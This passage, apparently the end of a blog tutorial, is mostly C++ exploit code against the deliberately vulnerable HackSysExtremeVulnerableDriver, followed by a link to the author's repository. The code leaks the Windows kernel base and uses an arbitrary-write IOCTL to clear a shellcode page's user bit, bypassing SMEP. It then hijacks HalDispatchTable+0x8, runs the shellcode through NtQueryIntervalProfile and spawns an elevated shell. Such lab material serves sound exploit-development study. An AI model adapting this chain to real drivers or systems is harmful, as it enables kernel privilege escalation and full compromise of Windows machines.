	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

	if (NtQuerySystemInformation == nullptr) {
		printf("\n[ERROR GETTING THE ADDRESS TO \"NtQuerySystemInformation\"]\n");
		return 0;
	}

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &ReturnLength);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(nullptr, ReturnLength,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, pModuleInfo, ReturnLength, &ReturnLength);
	if (Status != 0x0) {
		printf("\nError getting the length of the Module Struct -> 0x%0.16X\n", Status);
		return 0;
	}

	printf("\n[Module Name] %s\n\t\\__[Base Address] 0x%p\n\t\\__[Module Size] %p\n",
		pModuleInfo->Modules[0].Name, pModuleInfo->Modules[0].ImageBaseAddress, pModuleInfo->Modules[0].ImageSize);

	char* ModuleName = pModuleInfo->Modules[0].Name;
	PVOID ModuleBase = pModuleInfo->Modules[0].ImageBaseAddress;
	ULONG ModuleSize = pModuleInfo->Modules[0].ImageSize;

	printf("\npModuleInfo->Modules[0] -> 0x%p\n", pModuleInfo->Modules[0]);

	VirtualFree(pModuleInfo, ReturnLength, MEM_RELEASE);

	return (UINT64)ModuleBase;
}


int main() {

	UINT64 pKernelBase = GetNtBase();

	if (pKernelBase == 0) {
		printf("\n[!] ERROR GETTING THE KERNEL BASE ADDRESS\n");
		getchar();
		return -1;
	}
	printf("\n[KERNEL BASE Addr] -> 0x%p\n", pKernelBase);

	HMODULE hKernelBase = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
	if (hKernelBase == INVALID_HANDLE_VALUE) {
		printf("\n[!] ERROR GETTING A HANDLE TO \"ntoskrnl.exe\": %d\n", GetLastError());
		getchar();
		return -1;
	}
	printf("[hKernelBase] -> 0x%p\n", hKernelBase);

	UINT64 OffHalDispatchTable = 0;
	PVOID pHalDispatchTable = GetProcAddress(hKernelBase, "HalDispatchTable");
	if (pHalDispatchTable == nullptr) {
		printf("\n[!] ERROR GETTING THE ADDRESS TO \"HalDispatchTable\": %d\n", GetLastError());
		CloseHandle(hKernelBase);
		getchar();
		return -1;
	}
	else {
		OffHalDispatchTable = (UINT_PTR)pHalDispatchTable - (UINT_PTR)hKernelBase;
		printf("\n[HalDispatchTable KM Address] -> 0x%p\n\t\\__[HalDispatchTable Offset] -> 0x%p\n", (pKernelBase + OffHalDispatchTable), OffHalDispatchTable);
		CloseHandle(hKernelBase);
	}

	HANDLE hHEVD = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),
		0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hHEVD == INVALID_HANDLE_VALUE) {
		printf("\nError getting a handle to the driver\n");
		CloseHandle(hKernelBase);
		getchar();
		//return -1;
	}
	printf("HANDLE created successfully!\n");
	
	WRITE_WHAT_WHERE WhaWhe = { 0 };

	void* ShellcodeAddr = VirtualAlloc(nullptr, SHELLCODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(ShellcodeAddr, pShellcode, SHELLCODE_SIZE);

	UINT64 ShellcodePageBase = (ULONG_PTR)ShellcodeAddr >> 9;
	ShellcodePageBase &= 0x7FFFFFFFF8;
	ShellcodePageBase += 0xFFFFF68000000000;

	printf("\n[UM Shellcode Page Base] -> 0x%p\n", ShellcodePageBase);

	PVOID Pte_details = nullptr;

	WhaWhe.What = (void*)ShellcodePageBase;
	WhaWhe.Where = (void*)&Pte_details;

	ULONG lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;
	
	printf("[+] PTE Details -> 0x%p\n", Pte_details);

	printf("[0x4 bit form U to K]\n");
	*(UINT64*)&Pte_details &= ~(0x4);
	printf("[+] PTE Details -> 0x%p\n", Pte_details);


	WhaWhe.What = (void*)&Pte_details;
	WhaWhe.Where = (void*)ShellcodePageBase;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	printf("[Page changed to Kernel Mode]\n");

	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

	UINT64 HalDispatchTable0x8 = (pKernelBase + OffHalDispatchTable + 0x8);
	WhaWhe.What = (void*)&ShellcodeAddr;
	WhaWhe.Where = (void*)HalDispatchTable0x8;

	lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	
	printf("\n[+] HalDispatchTable0x8 changed successfully\n");
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == nullptr) {
		printf("\n[!] ERROR GETTING THE POINTER TO \"NtQueryIntervalProfile\": %d\n", GetLastError());
		VirtualFree(ShellcodeAddr, 160, MEM_RELEASE);
		CloseHandle(hHEVD);
		getchar();
		return -1;
	}
	printf("[NtQueryIntervalProfile] -> 0x%p\n", NtQueryIntervalProfile);


	ULONG Interval = 0;
	NTSTATUS Status = NtQueryIntervalProfile((_KPROFILE_SOURCE)0x3, &Interval);
	if (Status != 0) {
		printf("\nERROR EXECUTING \"NtQueryIntervalProfile\": 0x%0.16X\n", Status);
		VirtualFree(ShellcodeAddr, SHELLCODE_SIZE, MEM_RELEASE);
		CloseHandle(hHEVD);
		getchar();
		return -1;
	}

	// Restore the changed address to avoid BSOD
	WhaWhe.What = (void*)&HalDispatchTable0x8;
	WhaWhe.Where = (void*)HalDispatchTable0x8;

	lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);

	printf("\n[+] HalDispatchTable0x8 restored successfully\n");
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;


	*(UINT64*)&Pte_details |= 0x4;

	WhaWhe.What = (void*)&Pte_details;
	WhaWhe.Where = (void*)ShellcodePageBase;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	printf("[Page Restored successfully to UM]\n");

	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

	printf("\nGenerating a Shell...\n");

	SpawnShell();

	CloseHandle(hHEVD);
	// VirtualFree(ShellcodeAddr, SHELLCODE_SIZE, MEM_RELEASE);
	return 0;
}
```

## Closing
You can check the codes on my github repo [Smep Bypass](https://github.com/r0keb/Smep-Bypass)

Good morning, and in case I don’t see ya: Good afternoon, good evening, and good night!
